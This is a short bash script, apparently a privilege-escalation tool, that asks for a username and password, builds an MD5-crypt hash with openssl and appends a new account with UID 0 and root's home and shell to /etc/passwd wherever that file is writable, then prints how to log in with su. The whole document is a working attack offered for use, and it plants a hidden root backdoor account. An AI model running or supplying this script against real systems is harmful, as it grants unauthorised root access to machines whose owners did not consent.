#!/bin/bash
#If you have write permission for /etc/passwd you simply run the script and it will create a root user for you
#Asking user for input
read -p "Username: " username
read -p "Password: " parola

#Prepares a hash for /etc/passwd
ssl=$(openssl passwd -1 -salt ignite $parola)

#/etc/passwd syntax: username:SALT+HASH:0:0:root:/root:/bin/bash
echo $username':'$ssl':0:0:root:/root:/bin/bash' >> /etc/passwd
if [ $? -eq 0 ]; then
	echo "Success!"
	echo "You can log in with: su "$username "ve "$parola
else
	echo "ERROR: Make sure you have write permission for /etc/passwd."
fi

